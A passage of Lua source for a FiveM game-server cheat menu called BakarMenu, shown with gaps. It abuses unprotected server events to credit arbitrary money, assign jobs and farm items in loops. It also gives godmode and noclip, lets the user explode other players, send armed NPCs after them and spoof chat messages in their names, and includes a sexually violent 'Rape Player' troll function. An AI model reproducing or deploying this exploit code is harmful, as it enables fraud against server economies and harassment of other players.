...
local G = 0.005;
local H = 0.370;
local I = "https://discord.gg/QMmrgrr "
local
function J(K) if e.debug then Citizen.Trace("[BakarMenu] "..tostring(K)) end end;
local
...
else aM("~h~Injected BakarMenu") end end;
local
...
function cG() for i = 0, 255 do x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i))) roundx = tonumber(string.format("%.2f", x)) roundy = tonumber(string.format("%.2f", y)) roundz = tonumber(string.format("%.2f", z)) while not HasModelLoaded(GetHashKey("prop_fnclink_05crnr1")) do Citizen.Wait(0) RequestModel(GetHashKey("prop_fnclink_05crnr1")) end;
    ...
    function bananapartyall() Citizen.CreateThread(function() for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("", "", {
                141, 211, 255
            }, "^"..av..
            "") end;
...
function RapeAllFunc() for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("", "", {
            141, 211, 255
        }, "^"..av..
        "") end;
...
function hweed() TriggerServerEvent('esx_drugs:pickedUpCannabis') TriggerServerEvent('esx_drugs:pickedUpCannabis') TriggerServerEvent('esx_drugs:pickedUpCannabis') TriggerServerEvent('esx_drugs:pickedUpCannabis') TriggerServerEvent('esx_drugs:pickedUpCannabis') TriggerServerEvent('esx_drugs:pickedUpCannabis') TriggerServerEvent('esx_drugs:pickedUpCannabis') TriggerServerEvent('esx_drugs:pickedUpCannabis') TriggerServerEvent('esx_drugs:pickedUpCannabis') TriggerServerEvent('esx_drugs:pickedUpCannabis') TriggerServerEvent('esx_drugs:pickedUpCannabis') TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestWeed") end;

function tweed() TriggerServerEvent('esx_drugs:processCannabis') TriggerServerEvent('esx_drugs:processCannabis') TriggerServerEvent('esx_drugs:processCannabis') TriggerServerEvent('esx_drugs:processCannabis') TriggerServerEvent('esx_drugs:processCannabis') TriggerServerEvent('esx_drugs:processCannabis') TriggerServerEvent('esx_drugs:processCannabis') TriggerServerEvent('esx_drugs:processCannabis') TriggerServerEvent('esx_drugs:processCannabis') TriggerServerEvent('esx_drugs:processCannabis') TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformWeed") end;
...
function hcoke() TriggerServerEvent('esx_drugs:pickedUpCoca') TriggerServerEvent('esx_drugs:pickedUpCoca') TriggerServerEvent('esx_drugs:pickedUpCoca')TriggerServerEvent('esx_drugs:pickedUpCoca') TriggerServerEvent('esx_drugs:pickedUpCoca') TriggerServerEvent('esx_drugs:pickedUpCoca') TriggerServerEvent('esx_drugs:pickedUpCoca') TriggerServerEvent('esx_drugs:pickedUpCoca') TriggerServerEvent('esx_drugs:pickedUpCoca') TriggerServerEvent('esx_drugs:pickedUpCoca') TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestCoke") end;

function tcoke() TriggerServerEvent('esx_drugs:processCoca') TriggerServerEvent('esx_drugs:processCoca') TriggerServerEvent('esx_drugs:processCoca') TriggerServerEvent('esx_drugs:processCoca') TriggerServerEvent('esx_drugs:processCoca') TriggerServerEvent('esx_drugs:processCoca') TriggerServerEvent('esx_drugs:processCoca') TriggerServerEvent('esx_drugs:processCoca') TriggerServerEvent('esx_drugs:processCoca') TriggerServerEvent('esx_drugs:processCoca') TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformCoke") end;
...
function htbl() TriggerServerEvent('esx_tabac:startHarvest')  TriggerServerEvent('esx_tabac:startHarvest') TriggerServerEvent('esx_tabac:startHarvest') TriggerServerEvent('esx_tabac:startHarvest') end;

function htbl2() TriggerServerEvent('esx_tabac:startHarvest2')  TriggerServerEvent('esx_tabac:startHarvest2') TriggerServerEvent('esx_tabac:startHarvest2') TriggerServerEvent('esx_tabac:startHarvest2') end;

function ttbl() TriggerServerEvent('esx_tabac:startCraft') TriggerServerEvent('esx_tabac:startCraft') TriggerServerEvent('esx_tabac:startCraft') TriggerServerEvent('esx_tabac:startCraft') TriggerServerEvent('esx_tabac:startCraft') TriggerServerEvent('esx_tabac:startCraft') end;

function ttbl2() TriggerServerEvent('esx_tabac:startCraft2') TriggerServerEvent('esx_tabac:startCraft2') TriggerServerEvent('esx_tabac:startCraft2') TriggerServerEvent('esx_tabac:startCraft2') TriggerServerEvent('esx_tabac:startCraft2') TriggerServerEvent('esx_tabac:startCraft2') end;

function ttbll() TriggerServerEvent('esx_tabac:startCraft3') TriggerServerEvent('esx_tabac:startCraft3') TriggerServerEvent('esx_tabac:startCraft3') TriggerServerEvent('esx_tabac:startCraft3') TriggerServerEvent('esx_tabac:startCraft3') TriggerServerEvent('esx_tabac:startCraft3') end;

function ttbll2() TriggerServerEvent('esx_tabac:startCraft4') TriggerServerEvent('esx_tabac:startCraft4') TriggerServerEvent('esx_tabac:startCraft4') TriggerServerEvent('esx_tabac:startCraft4') TriggerServerEvent('esx_tabac:startCraft4') TriggerServerEvent('esx_tabac:startCraft4') end;
...
Citizen.CreateThread(function() while bL do Citizen.Wait(0) SetPlayerInvincible(PlayerId(), Godmode) SetEntityInvincible(PlayerPedId(-1), Godmode) SetEntityVisible(GetPlayerPed(-1), dM, 0) if SuperJump
    ...
    if blowall then
    for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("", "", {
            141, 211, 255
        }, "^"..av..
        "") end;
    ...
    function vrpdestroy() for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("", "", {
            141, 211, 255
        }, "^"..av..
        "") end;
    ...
    e.CreateMenu(bM, bN) 
	e.CreateSubMenu(ms, bM, I)
	e.CreateSubMenu(bO, bM, I) 
	e.CreateSubMenu(bS, bM, I) 
	e.CreateSubMenu(bT, bM, I) 
	e.CreateSubMenu(bU, bM, I) 
	e.CreateSubMenu(bQ, bM, I) 
	e.CreateSubMenu(bV, bM, I)
	e.CreateSubMenu(bW, bM, I) 
	e.CreateSubMenu(bX, bW, I) 
	e.CreateSubMenu(bY, bU, I) 
	e.CreateSubMenu(bZ, bQ, I) 
	e.CreateSubMenu(cb, bQ, I)
	e.CreateSubMenu(zx, bQ, I) 
	e.CreateSubMenu(zc, bQ, I) 
	e.CreateSubMenu(ca, bQ, I) 
	e.CreateSubMenu(bR, bQ, I) 
	e.CreateSubMenu(c0, bQ, I) 
	e.CreateSubMenu(b_, bM, I) 
	e.CreateSubMenu(co, bX, I) 
	e.CreateSubMenu(c9, bX, I) 
	e.CreateSubMenu(cq, bT, I) 
	e.CreateSubMenu(cp, cq, I) 
	e.CreateSubMenu(cj, cp, I) 
	e.CreateSubMenu(cn, cj, I) 
	e.CreateSubMenu(cm, bV, I) 
	e.CreateSubMenu(ck, cm, I) 
	e.CreateSubMenu(c1, ck, I) 
	e.CreateSubMenu(c2, bV, I) 
	e.CreateSubMenu(c3, c2, I) 
	e.CreateSubMenu(cl, c3, I)
	e.CreateSubMenu(c5, bU, I) 
	e.CreateSubMenu(c4, bV, I) 
	e.CreateSubMenu(ap, bV, I) 
	e.CreateSubMenu(cg, c4, I)
	e.CreateSubMenu(ce, bX, I) 
	e.CreateSubMenu(ji, bX, I) 
	e.CreateSubMenu(cd, bV, I)
	e.CreateSubMenu(cc, c9, I)
	e.CreateSubMenu(c7, bV, I)
	e.CreateSubMenu(c6, bU, I) 
	e.CreateSubMenu(c8, bU, I) for i, eq in pairs(bC) do e.CreateSubMenu(eq.id, cg, eq.name) if eq.
    id == "paint"
    ...
    if e.IsMenuOpened(bM) then a5("Bienvenue a toi ~p~"..d.." ~s~!", 0.5, 0.5) if 
		e.MenuButton("~h~~r~😈~s~  Self Menu", bO) then elseif 
		e.MenuButton("~h~~r~ 👨‍👦‍👦 ~s~ Online Players", bW) then elseif 
		e.MenuButton("~h~~r~🌠~s~  Teleport Menu", bS) then elseif 
		e.MenuButton("~h~~r~🚘~s~  Vehicle Menu", bV) then elseif 
		e.MenuButton("~h~~r~🔫~s~  Weapon Menu", bT) then elseif 
		e.MenuButton("~h~~r~📲~s~  Lua Menu", bQ) then elseif 
		e.MenuButton("~h~~r~⚠️~s~  Advanced Mode", bU) then elseif 
		e.MenuButton("~h~~r~👑  ~y~Credits", b_) then elseif
		e.MenuButton("~h~~r~⚙️  ~r~Menu Options", ms) then end;
		e.Display() elseif e.IsMenuOpened(bO) then a5("Stuff for yourself", 0.58, 0.58) if 
		e.CheckBox("~h~~g~Godmode", Godmode, function(eC) Godmode = eC end) then elseif 
		e.CheckBox("~h~~g~Player Visible", dM, function(eC) dM = eC end) then elseif 
	    e.Button("~w~~h~🍉  Set hunger to ~h~~g~100") then TriggerEvent("esx_status:set", "hunger", 1000000) elseif 
	    e.Button("~w~~h~🍺  Set thirst to ~h~~g~100") then TriggerEvent("esx_status:set", "thirst", 1000000) elseif
	    e.Button("~h~~r~Suicide") then SetEntityHealth(PlayerPedId(-1), 0) elseif 
	    e.Button("~h~~g~ESX~s~ Revive Yourself~s~") then TriggerEvent("esx_ambulancejob:revive") elseif 
	    e.Button("~h~~g~Heal/Revive") then SetEntityHealth(PlayerPedId(-1), 200) elseif 
    	e.Button("~h~~b~Give Armour") then SetPedArmour(PlayerPedId(-1), 200) elseif 
	    e.CheckBox("~h~Infinite Stamina", InfStamina, function(eC) InfStamina = eC end) then elseif 
	    e.CheckBox("~h~Thermal ~o~Vision", bTherm, function(bTherm) end) then therm = not therm; bTherm = therm; SetSeethrough(therm) elseif 
		e.CheckBox("~h~Fast Run", fastrun, function(eC) fastrun = eC end) then elseif 
	    e.CheckBox("~h~Super Jump", SuperJump, function(eC) SuperJump = eC end) then elseif 
	    e.CheckBox("~h~Noclip", Noclip, function(eC) Noclip = eC end) then end; 
		
	e.Display() elseif e.IsMenuOpened(bW) then a5("All online players here", 0.58, 0.58) for i = 0, 128 do
    ...
    and GetPlayerServerId(i)  ~= 0 and e.MenuButton(GetPlayerName(i)..
        ...
        "]~s~ "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~h~~r~DEAD"
            or "~h~~g~ALIVE"), 'PlayerOptionsMenu') then SelectedPlayer = i end end; 
			e.Display() elseif e.IsMenuOpened(bX) then a5("Main selected player options", 0.58, 0.58) 
			e.SetSubTitle(bX, "Player Options ["..GetPlayerName(SelectedPlayer)..
        "]") if 
		e.MenuButton("~h~~p~#~s~ ESX Triggers", co) then elseif 
		e.MenuButton("~h~~p~#~s~ ESX Job Individual", ji) then elseif 
		e.MenuButton("~h~~p~#~s~ VRP Triggers", ce) then elseif 
		e.MenuButton("~h~~p~#~s~ Troll Menu", c9) then elseif 
		e.Button("~h~Spectate", di and "~g~[SPECTATING]") then SpectatePlayer(SelectedPlayer) elseif 
		e.Button("~h~~r~Semi GOD ~s~Player") then local eD = "stt_prop_stunt_soccer_ball"
    ...
    then local dZ = GetPlayerServerId(PlayerId()) TriggerEvent("bank:transfer", dZ, GetPlayerServerId(SelectedPlayer), eI) TriggerServerEvent("bank:transfer", eJ, eI) end end; e.Display() elseif e.IsMenuOpened(c9) then a5("~r~Troll ~s~features for player", 0.58, 0.58) if e.MenuButton("~h~~p~#~s~ Spawn Peds", cc) then elseif e.Button("~h~~r~Fake ~s~Chat Message") then local eK = KeyboardInput("Enter message to send", "", 100) local eL = GetPlayerName(SelectedPlayer) if eK then TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("", eL, {
        0, 0x99, 255
    ...
    else aM("~h~~b~Player not in a vehicle~s~.", false) end elseif e.Button("~h~~r~Banana ~p~Party ~y~v2") then local d = CreateObject(-1207431159, 0, 0, 0, true, true, true) local cJ = CreateObject(GetHashKey("cargoplane"), 0, 0, 0, true, true, true) local cK = CreateObject(GetHashKey("prop_beach_fire"), 0, 0, 0, true, true, true) AttachEntityToEntity(d, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) AttachEntityToEntity(cJ, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) AttachEntityToEntity(cK, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) elseif e.Button("~h~~r~Small ~s~Explosion") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0) elseif e.Button("~h~~r~Explode ~s~Player") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0) AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true) elseif e.Button("~h~~r~Rape ~s~Player") then RequestModelSync("a_m_o_acult_01") RequestAnimDict("rcmpaparazzo_2") while not HasAnimDictLoaded("rcmpaparazzo_2") do Citizen.Wait(0) end;
    ...
    for i = 0, 10 do local cM = GetEntityCoords(GetPlayerPed(SelectedPlayer)) RequestModel(GetHashKey(eU)) Citizen.Wait(50) if HasModelLoaded(GetHashKey(eU))
    then local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z, 0, true, true) and CreatePed(21, GetHashKey(eU), cM.x - i, cM.y + i, cM.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped) if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then local eT = PedToNet(ped) NetworkSetNetworkIdDynamic(eT, false) SetNetworkIdCanMigrate(eT, true) SetNetworkIdExistsOnAllMachines(eT, true) Citizen.Wait(500) NetToPed(eT) GiveWeaponToPed(ped, GetHashKey(eS), 9999, 1, 1) SetEntityInvincible(ped, true) SetPedCanSwitchWeapon(ped, true) TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then TaskCombatHatedTargetsInArea(ped, cM.x, cM.y, cM.z, 500)
    else Citizen.Wait(0) end end end end; e.Display() elseif IsDisabledControlPressed(0, 121) then cu() 
	
	e.Display() elseif e.IsMenuOpened(bS) then a5("Teleport options for you", 0.38, 0.38) if 
	e.Button("~h~Teleport to ~g~waypoint") then d2() elseif 
	e.Button("~h~Teleport into ~g~nearest ~s~vehicle") then cW() elseif 
	e.Button("~h~Teleport to ~r~coords") then cP() elseif e.Button("~h~Draw custom ~r~blip ~s~on map") then cT() elseif 
	e.CheckBox("~h~Show ~g~Coords", showCoords, function(eC) showCoords = eC end) then end; 
	
	e.Display() elseif e.IsMenuOpened(bT) then a5("Main weapon features list", 0.58, 0.58) if 
	e.MenuButton("~h~~p~#~s~ Give Single Weapon", cq) then elseif 
	e.Button("~h~~g~Give All Weapons") then
    for i = 1, #bn do GiveWeaponToPed(PlayerPedId(-1), GetHashKey(bn[i]), 1000, false, false) end elseif 
	e.Button("~h~~r~Remove All Weapons") then RemoveAllPedWeapons(PlayerPedId(-1), true) elseif 
	e.Button("~h~Drop your current Weapon") then local au = GetPlayerPed(-1) local b = GetSelectedPedWeapon(au) SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1) elseif 
	e.Button("~h~~g~Give All Weapons to ~s~everyone") then
    for
    eV = 0, 128 do
        if eV ~=
    PlayerId(-1) and GetPlayerServerId(eV)  ~= 0 then
    for i = 1, #bn do GiveWeaponToPed(GetPlayerPed(eV), GetHashKey(bn[i]), 1000, false, false) end end end elseif 
	e.Button("~h~~r~Remove All Weapons from ~s~everyone") then
    for
    eV = 0, 128 do
        if eV ~=
    PlayerId(-1) and GetPlayerServerId(eV)  ~= 0 then
    for i = 1, #bn do RemoveWeaponFromPed(GetPlayerPed(eV), GetHashKey(bn[i])) end end end elseif 
	e.Button("~h~Give Ammo") then
    for
    i = 1, #bn do AddAmmoToPed(PlayerPedId(-1), GetHashKey(bn[i]), 200) end elseif 
	e.CheckBox("~h~~r~OneShot Kill", oneshot, function(eC) oneshot = eC end) then elseif 
	e.CheckBox("~h~~r~OneShot Car", oneshotcar, function(eC) oneshotcar = eC end) then elseif 
	e.CheckBox("~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Flare Gun", rainbowf, function(eC) rainbowf = eC end) then elseif 
	e.CheckBox("~h~Vehicle Gun", VehicleGun, function(eC) VehicleGun = eC end) then elseif 
	e.CheckBox("~h~Delete Gun", DeleteGun, function(eC) DeleteGun = eC end) then end;
   ...
   e.Display() elseif e.IsMenuOpened(cg) then veh = GetVehiclePedIsUsing(PlayerPedId()) for i, eq in pairs(bC) do
    ...
    if not bx then bz = "paint"
    bB = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) by = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, eW.id) bx = true elseif bx and currims == eW.id then SetVehicleExtraColours(veh, oldpearl, eW.id) bx = false; bz = -1; by = -1 elseif bx and currims ~= eW.id then SetVehicleExtraColours(veh, oldpearl, eW.id) bx = true end end end; 
	
	e.Display() elseif e.IsMenuOpened(bV) then a5("Vehicle features for you", 0.58, 0.58) if 
	e.MenuButton("~h~~p~#~s~ ~h~~b~LSC ~s~Customs", c4) then elseif 
	e.MenuButton("~h~~p~#~s~ ~h~~b~Auto ~s~Pilote", ap) then elseif 
	e.MenuButton("~h~~p~#~s~ Vehicle ~g~Boost", cd) then elseif 
	e.MenuButton("~h~~p~#~s~ Vehicle List", cm) then elseif 
	e.MenuButton("~h~~p~#~s~ Global Car Trolls", c7) then elseif 
	e.MenuButton("~h~~p~#~s~ Spawn & Attach ~s~Trailer", c2) then elseif 
	e.Button("~h~Spawn ~r~Custom ~s~Vehicle") then d6() elseif 
	e.Button("~h~~g~Repair ~s~Vehicle") then d8() elseif e.Button("~h~~g~Repair ~s~Engine") then d9() elseif 
	e.Button("~h~~r~Delete ~s~Vehicle") then DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif 
	e.CheckBox("~h~Vehicle Godmode", VehGod, function(eC) VehGod = eC end) then elseif 
	e.CheckBox("~h~~b~NoFall ~s~ Vehicle", Nofall, function(dR) Nofall = dR; SetPedCanBeKnockedOffVehicle(PlayerPedId(-1), Nofall) end) then elseif
	e.CheckBox("~h~~b~Waterproof ~s~Vehicle", waterp, function(eC) waterp = eC end) then elseif 
	e.CheckBox("~h~Speedboost ~g~SHIFT ~r~CTRL", VehSpeed, function(eC) VehSpeed = eC end) then end; 
	
	e.Display() elseif e.IsMenuOpened(c7) then
    if e.Button("~h~~r~Flip ~s~Vehicle") then daojosdinpatpemata() elseif
	e.CheckBox("~h~~r~EMP~s~ Nearest Vehicles", destroyvehicles, function(eC) destroyvehicles = eC end) then elseif 
	e.CheckBox("~h~~r~Delete~s~ Nearest Vehicles", deletenearestvehicle, function(eC) deletenearestvehicle = eC end) then elseif 
	e.CheckBox("~h~~r~Alarm~s~ Nearest Vehicles", alarmvehicles, function(eC) alarmvehicles = eC end) then elseif 
	e.Button("~h~~r~BORGAR~s~ Nearest Vehicles") then local cC = GetHashKey("xs_prop_hamburgher_wl") for vehicle in EnumerateVehicles() do local cD = CreateObject(cC, 0, 0, 0, true, true, true) AttachEntityToEntity(cD, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) end elseif 
	e.CheckBox("~h~~r~Explode~s~ Nearest Vehicles", explodevehicles, function(eC) explodevehicles = eC end) then elseif 
	e.CheckBox("~h~~p~Fuck~s~ Nearest Vehicles", fuckallcars, function(eC) fuckallcars = eC end) then end;
	
	e.Display() elseif e.IsMenuOpened(ap) then
	local function AddVehicleAutoPilot(menu)
        local vehicleAutoPilotMenu = (HoaxMenuPool:AddSubMenu(menu, "Vehicle Auto Pilot", "Manage vehicle auto pilot options."))
	...
	e.Display() elseif e.IsMenuOpened(bQ) then a5("All handy LUA triggers", 0.46, 0.46) if 
	e.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Money", bZ) then elseif 
	e.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Misc", ca) then elseif 
	e.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Boss", zx) then elseif 
	e.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Jobs", zc) then elseif 
	e.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Farm ", cb) then elseif 
	e.MenuButton("~h~~p~#~s~ ~y~VRP ~s~Triggers", bR) then elseif 
	e.MenuButton("~h~~p~#~s~ ~b~Misc ~s~Triggers", c0) then end; 
	
	e.Display() elseif e.IsMenuOpened(zx) then a5("ESX MenuBoss MenuPatron", 0.25, 0.25) if
	e.Button("~h~Boss Police ") then TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end) elseif
	e.Button("~h~Boss Ambulance ") then TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end) elseif
	e.Button("~h~Boss Mecano ") then TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end) elseif
	e.Button("~h~Boss Taxi ") then TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end) elseif
	e.Button("~h~Boss Cardealer ") then TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end) elseif
	e.Button("~h~Boss Realestateagent ") then TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end) elseif
    e.Button("~h~Boss Custom ") then local j = KeyboardInput("Entre le nom ", "", 100) if j ~= "" then TriggerEvent('esx_society:openBossMenu', j, function(data,menu) menu.close() end) end end;
	
	e.Display() elseif e.IsMenuOpened(zc) then if
	e.Button("~h~Job Police ") then TriggerServerEvent('esx_joblisting:setJob','police') TriggerServerEvent('esx_joblisting:setJob','lspd') elseif
    e.Button("~h~Job Ambulance ") then TriggerServerEvent('esx_joblisting:setJob','ems') TriggerServerEvent('esx_joblisting:setJob','ambulance') elseif
    e.Button("~h~Job Mecano ") then TriggerServerEvent('esx_joblisting:setJob','mecano') TriggerServerEvent('esx_joblisting:setJob','mechano') elseif
    e.Button("~h~Job Taxi ") then TriggerServerEvent('esx_joblisting:setJob','taxi') elseif
    e.Button("~h~Job Cardealer ") then TriggerServerEvent('esx_joblisting:setJob','cardealer') TriggerServerEvent('esx_joblisting:setJob','concessionaire') elseif
    e.Button("~h~Job Realestateagent ") then TriggerServerEvent('esx_joblisting:setJob','Realestateagent') elseif
    e.Button("~h~Job Custom ") then local j = KeyboardInput("Entre le nom ", "", 100) if j ~= "" then TriggerServerEvent('esx_joblisting:setJob', j) end end;

	e.Display() elseif e.IsMenuOpened(ji) then if
	e.Button("~h~Set Unemployed") then TriggerServerEvent("NB:destituerplayer", GetPlayerServerId(SelectedPlayer)) UnemployedPlayer(SelectedPlayer) elseif 
	e.Button("~h~Set ~b~Police ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "police", 3) PolicePlayer(SelectedPlayer) elseif 
	e.Button("~h~Set ~o~Mecano ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "mecano", 3) MecanoPlayer(SelectedPlayer) elseif 
	e.Button("~h~Set ~y~Taxi ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "taxi", 3) TaxiPlayer(SelectedPlayer) elseif 
	e.Button("~h~Set ~r~Ambulance ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "ambulance", 3) AmbulancePlayer(SelectedPlayer) elseif 
	e.Button("~h~Set ~g~Real Estate ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "realestateagent", 3) RealEstateAgentPlayer(SelectedPlayer) elseif 
	e.Button("~h~Set ~r~Car ~b~Dealer ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "cardealer", 3) CarDealerPlayer(SelectedPlayer) end; 
	
	
	e.Display() elseif e.IsMenuOpened(bZ) then a5("ESX Triggers for money only", 0.58, 0.58) if 
	e.Button("~h~~o~Automatic Money ~r~ WARNING!") then automaticmoneyesx() elseif 
	e.Button("~g~~h~ESX ~y~Caution Give Back") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= "" then TriggerServerEvent("esx_jobs:caution", "give_back", j) end elseif 
	e.CheckBox("~g~~h~ESX Hunting~y~ reward", huntspam, function(eC) huntspam = eC end) then elseif 
	e.Button("~g~~h~ESX ~y~KorioZ-PersonalMenu Bank") then local j = KeyboardInput("Combien veut tu ?", "", 100) if j ~= "" then TriggerServerEvent('KorioZ-PersonalMenu:Admin_giveBak', j) end elseif 
	e.Button("~g~~h~ESX ~y~KorioZ-PersonalMenu Cash") then local j = KeyboardInput("Combien veut tu ?", "", 100) if j ~= "" then TriggerServerEvent('KorioZ-PersonalMenu:Admin_giveCash', j) end elseif 
	e.Button("~g~~h~ESX ~y~KorioZ-PersonalMenu Black") then local j = KeyboardInput("Combien veut tu ?", "", 100) if j ~= "" then TriggerServerEvent('KorioZ-PersonalMenu:Admin_giveDirtyMoney', j) end elseif 
	e.Button("~g~~h~ESX ~y~DMV School") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= "" then TriggerServerEvent("esx_dmvschool:pay", {
        costs = -j
    }) end elseif 
	e.Button("~g~~h~ESX ~y~Dirty Job") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= "" then TriggerServerEvent("esx_godirtyjob:pay", j) end elseif 
	e.Button("~g~~h~ESX ~y~Pizza Boy") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= "" then TriggerServerEvent("esx_pizza:pay", j) end elseif 
	e.Button("~g~~h~ESX ~y~Ranger Job") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= "" then TriggerServerEvent("esx_ranger:pay", j) end elseif 
	e.Button("~g~~h~ESX ~y~Garbage Job") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= "" then TriggerServerEvent("esx_garbagejob:pay", j) end elseif 
	e.Button("~g~~h~ESX ~y~Car Thief ~r~DIRTY MONEY") then local j = KeyboardInput("Enter amount of dirty money", "", 100) if j ~= "" then TriggerServerEvent("esx_carthief:pay", j) end elseif 
	e.Button("~g~~h~ESX ~y~Trucker Job") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= "" then TriggerServerEvent("esx_truckerjob:pay", j) end elseif 
	e.Button("~g~~h~ESX ~y~Admin Give Bank") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= "" then TriggerServerEvent("AdminMenu:giveBank", j) end elseif 
	e.Button("~g~~h~ESX ~y~Admin Give Cash") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= "" then TriggerServerEvent("AdminMenu:giveCash", j) end elseif 
	e.Button("~g~~h~ESX ~y~Postal Job") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= "" then TriggerServerEvent("esx_gopostaljob:pay", j) end elseif 
	e.Button("~g~~h~ESX ~y~Banker Job") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= "" then TriggerServerEvent("esx_banksecurity:pay", j) end elseif 
	e.Button("~g~~h~ESX ~y~Slot Machine") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= "" then TriggerServerEvent("esx_slotmachine:sv:2", j) end end; 
	
	e.Display() elseif e.IsMenuOpened(ca) then a5("ESX Triggers for thirst/dmv etc", 0.42, 0.42) if  
	e.Button("~g~~h~ESX ~r~Revive v1") then local M = KeyboardInput("Enter Player ID or all", "", 1000) if M then
    if M == "all"
    then
    ...
    else TriggerEvent("esx_ambulancejob:revive", M) TriggerEvent("esx_ambulancejob:revive", M) end end elseif 
	e.Button("~g~~h~ESX ~b~Handcuff") then local M = KeyboardInput("Enter Player ID or all", "", 1000) if M
    then
    if M == "all"
    then
    ...
    else TriggerEvent("esx_policejob:handcuff", M) TriggerServerEvent("esx_policejob:handcuff", M) end end elseif 
	e.Button("~h~Avoir tout les permis ") then TriggerServerEvent('esx_dmvschool:addLicense', 'dmv') TriggerServerEvent("esx_dmvschool:addLicense", 'drive') TriggerServerEvent("esx_dmvschool:addLicense", 'drive_bike') TriggerServerEvent('esx_dmvschool:addLicense', 'drive_truck') elseif 
	e.Button("~h~~b~Buy ~s~a vehicle for ~g~free") then db() end;
	
    e.Display() elseif e.IsMenuOpened(cb) then a5("ESX Triggers for drugs & tabac", 0.58, 0.58) if  
	e.Button("~h~~r~Harvest ~y~Tabac Blond") then htbl() elseif
	e.Button("~h~~r~Transform 1 ~y~Tabac Blond") then ttbl() elseif  
	e.Button("~h~~r~Transform 2 ~y~Tabac Blond") then ttbll() elseif 
	e.Button("~h~~b~Harvest ~y~Tabac Brun") then htbl2() elseif
	e.Button("~h~~b~Transform 1 ~y~Tabac Brun") then ttbl2() elseif  
	e.Button("~h~~b~Transform 2 ~y~Tabac Brun") then ttbll2() elseif 
	e.Button("~h~~g~Harvest ~g~Weed") then hweed() elseif 
	e.Button("~h~~g~Transform ~g~Weed") then tweed() elseif 
	e.Button("~h~~g~Sell ~g~Weed ") then sweed() elseif 
